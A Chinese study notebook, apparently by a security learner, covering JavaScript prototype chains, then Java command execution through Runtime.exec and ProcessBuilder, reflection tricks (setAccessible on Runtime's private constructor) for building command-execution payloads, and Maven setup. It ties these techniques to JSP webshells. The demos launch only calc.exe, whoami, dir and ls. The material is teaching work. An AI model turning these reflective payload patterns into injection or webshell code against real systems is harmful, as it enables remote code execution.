JavaScript 对象是动态的属性（指**其自有属性**）“包”。JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。

```javascript
const o = {
  a: 1,
  b: 2,
  // __proto__ 设置了 [[Prototype]]。它在这里被指定为另一个对象字面量。
  __proto__: {
    b: 3,
    c: 4,
  },
};

// o.[[Prototype]] 具有属性 b 和 c。
// o.[[Prototype]].[[Prototype]] 是 Object.prototype（我们会在下文解释其含义）。
// 最后，o.[[Prototype]].[[Prototype]].[[Prototype]] 是 null。
// 这是原型链的末尾，值为 null，
// 根据定义，其没有 [[Prototype]]。
// 因此，完整的原型链看起来像这样：
// { a: 1, b: 2 } ---> { b: 3, c: 4 } ---> Object.prototype ---> null

console.log(o.a); // 1
// o 上有自有属性“a”吗？有，且其值为 1。

console.log(o.b); // 2
// o 上有自有属性“b”吗？有，且其值为 2。
// 原型也有“b”属性，但其没有被访问。
// 这被称为属性遮蔽（Property Shadowing）

console.log(o.c); // 4
// o 上有自有属性“c”吗？没有，检查其原型。
// o.[[Prototype]] 上有自有属性“c”吗？有，其值为 4。

console.log(o.d); // undefined
// o 上有自有属性“d”吗？没有，检查其原型。
// o.[[Prototype]] 上有自有属性“d”吗？没有，检查其原型。
// o.[[Prototype]].[[Prototype]] 是 Object.prototype 且
// 其默认没有“d”属性，检查其原型。
// o.[[Prototype]].[[Prototype]].[[Prototype]] 为 null，停止搜索，
// 未找到该属性，返回 undefined。

```

JavaScript 并没有其他基于类的语言所定义的“[方法](https://developer.mozilla.org/zh-CN/docs/Glossary/Method)”。在 JavaScript 中，任何函数都被可以添加到对象上作为其属性。函数的继承与其他属性的继承没有差别，包括上面的“属性遮蔽”（这种情况相当于其他语言的*方法重写*）。

当继承的函数被调用时，[`this`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this) 值指向的是当前继承的对象，而不是拥有该函数属性的原型对象。

```javascript
const parent = {
  value: 2,
  method() {
    return this.value + 1;
  },
};

console.log(parent.method()); // 3
// 当调用 parent.method 时，“this”指向了 parent

// child 是一个继承了 parent 的对象
const child = {
  __proto__: parent,
};
console.log(child.method()); // 3
// 调用 child.method 时，“this”指向了 child。
// 又因为 child 继承的是 parent 的方法，
// 首先在 child 上寻找“value”属性。但由于 child 本身
// 没有名为“value”的自有属性，该属性会在
// [[Prototype]] 上被找到，即 parent.value。

child.value = 4; // 在 child，将“value”属性赋值为 4。
// 这会遮蔽 parent 上的“value”属性。
// child 对象现在看起来是这样的：
// { value: 4, __proto__: { value: 2, method: [Function] } }
console.log(child.method()); // 5
// 因为 child 现在拥有“value”属性，“this.value”现在表示
// child.value
```



## Java安全

### 命令执行

最基本的 java中的命令执行

```Java
import java.io.IOException;

public class Calc {
    //当前执行命令无回显
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

>`Runtime`类表示运行时环境，并提供与运行时环境交互的方法：
>
>1. `exec(String command)`: 用于在系统的命令行执行指定的命令。
>2. `exec(String[] cmdarray)`: 用于在系统的命令行执行指定的命令，参数作为字符串数组传递。
>3. `exec(String command, String[] envp)`: 用于在系统的命令行执行指定的命令，并指定环境变量。
>4. `exec(String[] cmdarray, String[] envp)`: 用于在系统的命令行执行指定的命令，参数作为字符串数组传递，并指定环境变量。
>5. `exit(int status)`: 用于终止当前 Java 虚拟机。
>6. `freeMemory()`: 该方法用于返回Java虚拟机中的空闲内存量，以字节为单位。
>7. `maxMemory()`: 该方法用于返回Java虚拟机试图使用的最大内存量。
>8. `totalMemory()`: 该方法用于返回Java虚拟机中的内存总量。
>9. `availableProcessors()` : 返回虚拟机的处理器数量
>
>`Runtime`无法直接new 所以使用这个创建对象：`Runtime runtime = Runtime.getRuntime();`
>
>其中，最常用的方法是 `exec()` 方法，它允许你在 Java 程序中执行外部命令，`exec()`方法返回一个 `Process` 对象
>
>`Process` 类提供了以下方法来与子进程交互：
>
>1. `InputStream getInputStream()`: 获取子进程的标准输出流。
>2. `InputStream getErrorStream()`: 获取子进程的错误输出流。
>3. `OutputStream getOutputStream()`: 获取子进程的标准输入流。
>4. `int waitFor()`: 等待子进程执行完成并返回子进程的退出值。
>5. `int exitValue()`: 获取子进程的退出值（仅在子进程执行完成后才可调用）。

如果需要回显要用IO流将命令执行后的字节加载出来，然后最基本的按行读取，就可以了。

在进行网站开发入JSP的时候，我们使用的JSP一句话木马也是根据这个原理进行编写的。

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) throws IOException {
        Process p = Runtime.getRuntime().exec("whoami");
        InputStream is = p.getInputStream();
        InputStreamReader isr = new InputStreamReader(is, "GBK");
        BufferedReader ibr = new BufferedReader(isr);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while((line = ibr.readLine()) != null){
            sb.append(line);
            System.out.println(line);
        }
        is.close();
        isr.close();
        ibr.close();
        is = null;
        isr = null;
        ibr = null;
    }
}
```

>四个模块：
>
>1. `java.io.IOException`: 这是 Java 的输入输出操作中最常见的异常类。它表示在进行输入和输出操作时可能出现的错误情况，例如文件不存在、权限问题、设备错误等。当执行输入输出操作时，如果发生异常，就可以通过捕获 `IOException` 异常来处理这些错误情况。
>2. `java.io.InputStream`: 这是一个字节输入流类，它是所有输入流的抽象基类。`InputStream` 用于从输入源（例如文件、网络连接、字节数组等）读取字节数据。它提供了 `read()` 方法用于读取单个字节，以及其他相关的方法用于读取多个字节数据。
>3. `java.io.InputStreamReader`: 这是一个字符输入流类，它是 `Reader` 类的子类。`InputStreamReader` 可以将字节输入流（`InputStream`）转换为字符输入流，从而可以方便地读取文本数据。它提供了和 `Reader` 类相似的方法，例如 `read()` 方法用于读取单个字符。
>4. `java.io.BufferedReader`: 这是一个字符缓冲输入流类，它继承自 `Reader` 类。`BufferedReader` 可以从字符输入流中读取文本数据，并以缓冲方式提高读取效率。它提供了 `readLine()` 方法用于逐行读取文本数据，常用于读取文本文件内容等场景。
>5. `StringBuilder` 是一个可变的字符串类，用于构建和修改字符串。用于处理大量字符串拼接和修改操作，避免频繁创建新的字符串对象，提高字符串处理性能。
>
>这些模块常常一起使用，例如在读取文本文件的场景中，可以使用 `FileInputStream`（字节输入流）读取文件的字节数据，然后通过 `InputStreamReader` 将字节数据转换为字符数据，最后再使用 `BufferedReader` 逐行读取字符数据。通过这种方式，可以高效地读取文本文件的内容，并处理可能出现的异常情况。

在不同的操作系统下，执行的命令的方式也是不一样的

#### Windows下

Windows下一班都会用`cmd`或者`powershell`去执行命令，但是powershell一般默认会限制执行策略，所以一般用`cmd`

```Java
String[] payload = {"cmd", "/c", "dir"};
Process p = Runtime.getRuntime().exec(payload);
```

#### Linux下

Linux一般使用`bash`执行命令，通常情况下是会有的，但是有的情况，可能没有bash，我们就可以使用`sh`来进行替代

```
String [] payload={"/bin/sh","-c","ls"}; 
Process p = Runtime.getRuntime().exec(payload);
```

>以下是一些常见 Shell 的二进制文件和对应的命令执行方式：
>
>1. Bash：
>   - 二进制文件路径：/bin/bash
>   - 命令执行方式：直接在终端中输入命令。
>2. Zsh：
>   - 二进制文件路径：/bin/zsh
>   - 命令执行方式：直接在终端中输入命令。
>3. Fish：
>   - 二进制文件路径：/usr/bin/fish
>   - 命令执行方式：在终端中使用 `fish -c 'command'` 的方式执行命令。
>4. Sh 或 Dash：
>   - 二进制文件路径：/bin/sh 或 /bin/dash（取决于系统配置）
>   - 命令执行方式：在终端中使用 `sh -c 'command'` 或 `dash -c 'command'` 的方式执行命令。

根据不同主机进行甄别：使用`getProperty`函数获取操作系统的名称

```Java
// System.getProperty("os.name");
System.out.println("操作系统：" + System.getProperty("os.name"));
// 操作系统：Windows 10
```

完整payload：

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) throws IOException {
        String sys = System.getProperty("os.name");
        String[] payload = null;
        System.out.println("操作系统：" + sys);
        if (sys.contains("Window")){
            String[] payloadCmd = {"cmd", "/c", "dir"};
            payload = payloadCmd.clone();
        }else{
            String[] payloadSh = {"/bin/sh", "-c", "ls"};
            payload = payloadSh.clone();
        }

        Process p = Runtime.getRuntime().exec(payload);
        InputStream is = p.getInputStream();
        InputStreamReader isr = new InputStreamReader(is, "GBK");
        BufferedReader ibr = new BufferedReader(isr);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while((line = ibr.readLine()) != null){
            sb.append(line);
            System.out.println(line);
        }
        is.close();
        isr.close();
        ibr.close();
        is = null;
        isr = null;
        ibr = null;
    }
}
```

### 反射

[Java 类的初始化顺序 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/122554857)

Java有四个基本特征：封装，继承，多态，抽象

Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。本质上其实就是动态的生成类似于上述的字节码，加载到jvm中运行

1. Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。
2. Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。
3. 反射调用方法时，会忽略权限检查，可以无视权限修改对应的值，因此容易导致安全性问题，（对安全研究人员来说提供了不小的帮助，hhhh）

这样⼀段代码，在你不知道传⼊的参数值 的时候，你是不知道他的作⽤是什么的：

```Java
public void execute(String className, String methodName) throws Exception {
    Class clazz = Class.forName(className);
 	clazz.getMethod(methodName).invoke(clazz.newInstance());
}
```

- 获取类的⽅法： `forName` 
- 实例化类对象的⽅法： `newInstance` 
- 获取函数的⽅法： `getMethod` 
- 执⾏函数的⽅法： `invoke`

#### 反射机制原理

反射机制的原理基础是理解Class类，类是java.lang.Class类的实例对象，而Class是所有的类的类。对于普通的对象，我们在创建实例的时候通常采用如下方法：

```java
Demo test = new Demo();
```

那么我们在创建class类的实例对象时是否可以同样用上面的方法创建呢

```java
Class c = new Class()；
```

答案是不行的，所以我们查看一下Class的源码，发现他的构造器是私有的，这意味着只有JVM可以创建Class的对象。
![image-20230722003643653](daydayup.assets/image-20230722003643653.png)

反射机制原理就是把Java类中的各种成分映射成一个个的Java对象，所以我们可以在运行时调用类中的所有成员（变量、方法）。下图是反射机制中类的加载过程：
![img](daydayup.assets/v2-12ed9f48c94e5e2a3c63b2ed9bc964b9_r.jpg)

#### 反射机制操作



> [通俗易懂的双亲委派机制_IT烂笔头的博客-CSDN博客](https://blog.csdn.net/codeyanbao/article/details/82875064)
>
> 1. 如果一个类加载器收到了类加载请求，它并不会自己先加载，而是把这个请求委托给父类的加载器去执行
> 2. 如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的引导类加载器；
>
> 3. 如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委派机制
>
> 4. 父类加载器一层一层往下分配任务，如果子类加载器能加载，则加载此类，如果将加载任务分配至系统类加载器也无法加载此类，则抛出异常
>    ![img](daydayup.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGV5YW5iYW8=,size_16,color_FFFFFF,t_70.png)

##### 获取Class对象

有三种方式获得一个Class对象

1. 通过调用一个普通的其他类的`getClass()`方法获得Class对象
2. 任何数据类型（包括基本数据类型）都有一个“静态”的Class属性，所以直接调用.class属性获得Class对象
3. 调用Class类的forName方法，获得Class的对象

![image-20230722003946555](daydayup.assets/image-20230722003946555.png)

##### 获取成员方法Method

得到该类所有的方法，不包括父类的：
`public Method getDeclaredMethods() `

得到该类所有的public方法，包括父类的：
`public Method getMethods()`

>获取当前类指定的成员方法时，
>
>`Method method = class.getDeclaredMethod("方法名");`
>`Method[] method = class.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用,号隔开);`

![image-20230722005912022](daydayup.assets/image-20230722005912022.png)

执行方法：`Process process = (Process) runtimeMethod.invoke(runtimeInstance, "calc");`

>###### `invoke()`方法
>
>`method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);`
>
>如果这个方法是一个普通方法，那么第一个参数是类对象，如果这个方法是一个静态方法，那么第一个参数是类。
>
>1. `invoke()`就是调用类中的方法，最简单的用法是可以把方法参数化`invoke(class, args)`
>    这里则是使用了` class.invoke(method,“参数”)`的一个方式
>2. 还可以把方法名存进数组`v[]`,然后循环里`invoke(test,v[i])`,就顺序调用了全部方法

##### 获取构造函数Constructor

获得该类所有的构造器，不包括其父类的构造器
`public Constructor<T> getDeclaredConstructors() `

获得该类所有public构造器，包括父类
`public Constructor<T> getConstructors() `

>###### `newInstance()`方法
>
>`class.newInstance()`的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用`newInstance`总是不成功，这时候原因可能是：
>
>1.  你使用的类没有无参构造函数 
>2.  你使用的类构造函数是私有的
>
>最最最常见的情况就是`java.lang.Runtime`，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：
>
>```
>Class clazz = Class.forName("java.lang.Runtime");
>clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "id");
>```
>
>你会得到这样一个错误：
>
>![image-20230728171457674](daydayup.assets/image-20230728171457674.png)
>
>原因是 Runtime 类的构造方法是私有的。
>
>原因是`Runtime`类的构造方法是私有的。 有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：
>
>```
>public class TrainDB {
>private static TrainDB instance = new TrainDB();
>public static TrainDB getInstance() {
>return instance;
>}
>private TrainDB() {
>// 建立连接的代码...
>}
>}
>```
>
>这样，只有类初始化的时候会执行一次构造函数，后面只能通过`getInstance`获取这个对象，避免建 立多个数据库连接。 回到正题，`Runtime`类就是单例模式，我们只能通过`Runtime.getRuntime()`来获取到`Runtime`对 象。我们将上述Payload进行修改即可正常执行命令了：
>
>```
>Class clazz = Class.forName("java.lang.Runtime");
>clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");
>```
>
>
>
>```
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
>```
>
>ProcessBuilder有两个构造函数：
>
>`public ProcessBuilder(List command)`
>`public ProcessBuilder(String... command)`
>
>我上面用到了第一个形式的构造函数，所以我在`getConstructor`的时候传入的是`List.class`。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。 
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
>```
>
>通过`getMethod("start")`获取到`start`方法，然后`invoke`执行，`invoke`的第一个参数就是 ProcessBuilder Object了。
>
>那么，如果我们要使用`public ProcessBuilder(String... command)`这个构造函数，需要怎样用反 射执行呢？
>
>这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 ... 这样的语法来表示“这个函数的参数个数是可变 的”。
>
>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的（也就不能重载）：
>
>```
>public void hello(String[] names) {}
>public void hello(String... names) {}
>```
>
>也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：
>
>```
>String[] names = {"hello", "world"};
>hello(names);
>```
>
>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。
>
>所以，我们将字符串数组的类`String[].class`传给`getConstructor`，获取`ProcessBuilder`的第二构造函数：
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>clazz.getConstructor(String[].class)
>```
>
>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();
>```
>
>按反射来写的话就是：
>
>```java
>Class<?> clazz = Class.forName("java.lang.ProcessBuilder");     clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
>```
>
>```Java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance((Object[]) new String[]{"calc.exe"}));
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
>// 以上两种形式都能够运行，但是下面的格式就不能运行
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[]{"calc.exe"}));
>/*
>报错信息为
>Exception in thread "main" java.lang.IllegalArgumentException: argument type mismatch
>at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
>at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
>at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
>at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
>at Main.main(Main.java:115)
>*/
>```
>
>原因：
>
>这个问题是因为Java的反射API在处理数组类型参数时的特性。
>
>在Java中，数组也是对象，`String[]`和`String[][]`是两种不同的类型，不能互相转换。`String[]`是字符串数组，`String[][]`是字符串数组的数组（也可以理解为二维数组）。
>
>在代码中，`clazz.getConstructor(String[].class)`是寻找一个接受字符串数组作为参数的构造函数。因此，你需要传递一个字符串数组的实例给`newInstance()`方法。
>
>在你的第一段代码中，你创建了一个字符串数组`new String[]{"calc.exe"}`，并将其转换为`Object[]`，这是正确的，因此代码可以运行。
>
>在你的第二段代码中，你创建了一个字符串数组的数组`new String[][]{{"calc.exe"}}`，然后直接传递给`newInstance()`方法。这也是正确的，因为`newInstance()`方法接受的是一个`Object...`类型的参数，这意味着它可以接受任何数量和类型的参数。在这种情况下，你的字符串数组的数组被视为一个单独的参数，因此代码可以运行。
>
>然而，在你的第三段代码中，你创建了一个字符串数组`new String[]{"calc.exe"}`，然后直接传递给`newInstance()`方法。这是错误的，因为`newInstance()`方法期望一个字符串数组的实例，而你提供的是一个字符串数组。这就像尝试将一个`String[]`类型的对象传递给一个期望`String[][]`类型的参数，显然是不匹配的，因此你得到了`IllegalArgumentException: argument type mismatch`的错误。
>
>更详细地解释一下。
>
>在Java中，方法和构造函数的参数都是静态的，也就是说，它们在编译时就已经确定了。当你使用反射API来调用一个方法或构造函数时，你需要提供一个与原始参数类型完全匹配的参数列表。
>
>当你调用`clazz.getConstructor(String[].class)`时，你正在寻找一个接受单个参数的构造函数，这个参数的类型是`String[]`。这意味着，当你调用`newInstance()`方法时，你需要提供一个`Object[]`，这个数组包含一个`String[]`对象。
>
>在你的第一段代码中：
>
>```java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance((Object[]) new String[]{"calc.exe"}));
>```
>
>你创建了一个字符串数组`new String[]{"calc.exe"}`，然后将其转换为`Object[]`。这是正确的，因为`newInstance()`方法期望一个`Object[]`，这个数组包含一个`String[]`对象。因此，这段代码可以正确运行。
>
>然而，在你的第三段代码中：
>
>```java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[]{"calc.exe"}));
>```
>
>你创建了一个字符串数组`new String[]{"calc.exe"}`，然后直接传递给`newInstance()`方法。这是错误的，因为`newInstance()`方法期望一个`Object[]`，这个数组包含一个`String[]`对象，而你提供的是一个`String[]`对象。这就像尝试将一个`String[]`类型的对象传递给一个期望`Object[]`类型的参数，显然是不匹配的，因此你得到了`IllegalArgumentException: argument type mismatch`的错误。
>
>为了解决这个问题，你需要将你的字符串数组包装在一个`Object[]`里，就像你在第一段代码中那样。这样，你就可以正确地调用`newInstance()`方法，而不会得到任何错误。
>
>
>
>```java
>    public static void main(String[] args) throws Exception {
>        printNumbers(new int[]{1,2,3});
>        printNumbers(1,2,3);
>    }
>
>    public static void printNumbers(int... numbers) {
>        System.out.println("The numbers are:");
>        for (int num : numbers) {
>            System.out.print(num + " ");
>        }
>        System.out.println();
>    }
>// 上述两种写法等价，int... numbers 等同于一个int数组，当传入多个int参数时会自动转换为int数组，如果传入int数组则直接使用int数组内数据
>```
>
>
>
>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();有佬知道为什么newinstance接受的是二维数组么
>这个问题解释：
>因为newInstance接受一个可变长参数也就是接受一个数组，你传进去的二维数组字符串数组的数组被视为一个单独的参数，举例就是传进去两个int参数1,2的话到nerInstance函数里面也会被编译成被一个Object数组包围的两个int类型参数，new Object[]{1, 2}，穿进去的二维数组外面这层被当做Object数组了，里面包围着字符串数组参数



>###### `getDeclaredConstructor()` 方法的语法如下：
>
>`public Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes) throws NoSuchMethodException`
>
>- `parameterTypes` 是一个可变参数列表，用于指定构造函数的参数类型。如果构造函数有参数，需要指定参数类型，如果没有参数，可以不传入该参数。
>- `T` 是构造函数所在类的类型。
>
>```Java
>Class<?> stuClass = Class.forName("student");
>//带有参数的构造函数
>Constructor<?> stuConstr = stuClass.getDeclaredConstructor(String.class, int.class);
>Object stuIns = stuConstr.newInstance("小王", 1);
>//无参构造函数
>Constructor<?> noStuConstr = stuClass.getDeclaredConstructor();
>Object noStuIns = noStuConstr.newInstance();
>```
>

![image-20230722135218913](daydayup.assets/image-20230722135218913.png)

`getDeclaredConstructor()`可以获得构造方法，也可以获得我们常用的`private`方法，其中`Runtime`的构造方法是`private`，我们无法直接调用，我们需要使用反射去修改方法的访问权限（使用`setAccessible`，修改为 true），再通过获取的构造器进行实例化对象

```Java
Class<?> runtimeClass = Class.forName("java.lang.Runtime");
Constructor constructor = runtimeClass.getDeclaredConstructor();
System.out.println(constructor);
constructor.setAccessible(true);
// Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白
Object runtimeInstance = constructor.newInstance();
//这里的话就等价于 Runtime rt = new Runtime();
```

##### 获取成员变量Field

获得该类自身声明的所有变量，不包括其父类的变量
`public Field getDeclaredFields() `

获得该类自所有的public成员变量，包括其父类变量
`public Field getFields()`

```Java
 // 获取类中的成员变量
 Field[] steFies = stuClass.getDeclaredFields();
 // 获取类中制定的成员变量
 Field stuFie = stuClass.getDeclaredField("id");
 // 设置成员变量为可访问状态
 stuFie.setAccessible(true);
 // 获取成员变量的值
 Object stuId = stuFie.get(stuIns);
 System.out.println(stuId);
 // 修改成员变量的值
 stuFie.set(stuIns, 2);
 Object stuIdNew = stuFie.get(stuIns);
 System.out.println(stuIdNew);
```

![image-20230722141131662](daydayup.assets/image-20230722141131662.png)

上述的完整Payload:

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException {
        System.out.println("1".getClass());
        System.out.println(people.class);
        System.out.println(Class.forName("java.lang.Runtime"));
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Class<?> studentClass = Class.forName("student");
        Method[] studentMethodAll = studentClass.getDeclaredMethods();
        Method[] studentMethod = studentClass.getMethods();

        System.out.println(studentClass + " -> getDeclaredMethods");
        for (Method m : studentMethodAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getMethods");
        for (Method m : studentMethod) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Constructor[] studentConstructorAll = studentClass.getDeclaredConstructors();
        Constructor[] studentConstructor = studentClass.getConstructors();
        System.out.println(studentClass + " -> getDeclaredConstructors");
        for (Constructor m : studentConstructorAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getConstructors");
        for (Constructor m : studentConstructor) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Field[] studentFieldAll = studentClass.getDeclaredFields();
        Field[] studentField = studentClass.getFields();
        System.out.println(studentClass + " -> getDeclaredFields");
        for (Field m : studentFieldAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getFields");
        for (Field m : studentField) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        try{
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");
            Constructor constructor = runtimeClass.getDeclaredConstructor();
            System.out.println(constructor);
            constructor.setAccessible(true);
            // Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白
            Object runtimeInstance = constructor.newInstance();
            //这里的话就等价于 Runtime rt = new Runtime();
            // 使用 Runtime 实例调用方法
            Method execMethod = runtimeClass.getDeclaredMethod("exec", String.class);
            Process result = (Process)execMethod.invoke(runtimeInstance, "calc.exe");

            String[] payload = {"cmd", "/c", "dir"};
            Method runtimeMethod = runtimeClass.getMethod("exec", String[].class);
            Process process = (Process) runtimeMethod.invoke(runtimeInstance, (Object) payload);

            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader =  new InputStreamReader(inputStream, "GBK");
            BufferedReader inputBufferedReader = new BufferedReader(inputStreamReader);
            String line = null;
            while ((line = inputBufferedReader.readLine()) != null) {
                System.out.println(line);
            }
            inputBufferedReader.close();
            inputStreamReader.close();
            inputStream.close();

            // 获取成员变量
            Class<?> stuClass = Class.forName("student");
            // 带有参数的构造函数
            Constructor<?> stuConstr = stuClass.getDeclaredConstructor(String.class, int.class);
            Object stuIns = stuConstr.newInstance("小王", 1);
            // 无参构造函数
            Constructor<?> noStuConstr = stuClass.getDeclaredConstructor();
            Object noStuIns = noStuConstr.newInstance();

            // 获取类中的成员变量
            Field[] steFies = stuClass.getDeclaredFields();
            // 获取类中制定的成员变量
            Field stuFie = stuClass.getDeclaredField("id");
            // 设置成员变量为可访问状态
            stuFie.setAccessible(true);
            // 获取成员变量的值
            Object stuId = stuFie.get(stuIns);
            System.out.println(stuId);
            // 修改成员变量的值
            stuFie.set(stuIns, 2);
            Object stuIdNew = stuFie.get(stuIns);
            System.out.println(stuIdNew);

        }catch (NoSuchMethodException | InvocationTargetException | InstantiationException | IllegalAccessException |
                IOException | NoSuchFieldException e) {
            throw new RuntimeException(e);
        }

    }
    public void execute(String className, String methodName) throws Exception {
        Class<?> clazz = Class.forName(className);
        clazz.getMethod(methodName).invoke(clazz.newInstance());
    }
}

class people {
    public String name = null;

    public people(){}

    public people(String name){
        this.name = name;
    }

    public void shout(){
        System.out.println(this.name+": 啊啊啊啊啊啊啊啊啊啊啊！！");
    }
}

class student extends people{

    private int id;
    public int num;

    public student(){
        System.out.println("无参构造");
    }

    private student(String name){
        System.out.println("私有构造：" + name);
    }
    public student(String name, int id) {
        super(name);
        this.id = id;
        System.out.println("正常构造");
    }

    private void copyHomework(){
        System.out.println("抄抄抄！！");
    }

    public void study(){
        System.out.println("学学学！！");
    }
}
```

### Maven的使用

>IDEA自带mavan路径`IDEA安装路径\plugins\maven\lib\maven3\bin`

#### 换仓库

将仓库改成阿里云的镜像仓库

打开maven里的conf文件，打开setings.xml文件，将下面mirror标签整体复制到mirrors标签的内部。

```xml
<mirrors>
    <mirror>
        <id>nexus-aliyun</id>
        <mirrorOf>central</mirrorOf>
        <name>Nexus aliyun</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public</url>
    </mirror>
</mirrors>
```

maven有三种仓库，分为：本地仓库、第三方仓库（私服）、中央仓库

Maven中的坐标使用三个『向量』在『Maven的仓库』中唯一的定位到一个『jar』包。

- **groupId**：公司或组织的 id，即公司或组织域名的倒序，通常也会加上项目名称

  例如：groupId：com.javatv.maven

- **artifactId**：一个项目或者是项目中的一个模块的 id，即模块的名称，将来作为 Maven 工程的工程名

  例如：artifactId：auth

  **version**：版本号

- 例如：version：1.0.0

![image-20231101142628470](daydayup.assets/image-20231101142628470.png)

#### pom.xml

pom.xml 配置文件就是 Maven 工程的核心配置文件

```xml
<!-- 当前Maven工程的坐标 -->
<groupId>com.example</groupId>
<artifactId>demo</artifactId>
<version>0.0.1-SNAPSHOT</version>
<name>demo</name>
<description>Demo project for Spring Boot</description>
<!-- 当前Maven工程的打包方式，可选值有下面三种： -->
<!-- jar：表示这个工程是一个Java工程  -->
<!-- war：表示这个工程是一个Web工程 -->
<!-- pom：表示这个工程是“管理其他工程”的工程 -->
<packaging>jar</packaging>
<properties>
    <!-- 工程构建过程中读取源码时使用的字符集 -->
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>
<!-- 当前工程所依赖的jar包 -->
<dependencies>
    <!-- 使用dependency配置一个具体的依赖 -->
    <dependency>
        <!-- 在dependency标签内使用具体的坐标依赖我们需要的一个jar包 -->
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.12</version>
        <!-- scope标签配置依赖的范围 -->
        <scope>test</scope>
    </dependency>
</dependencies>

```

依赖

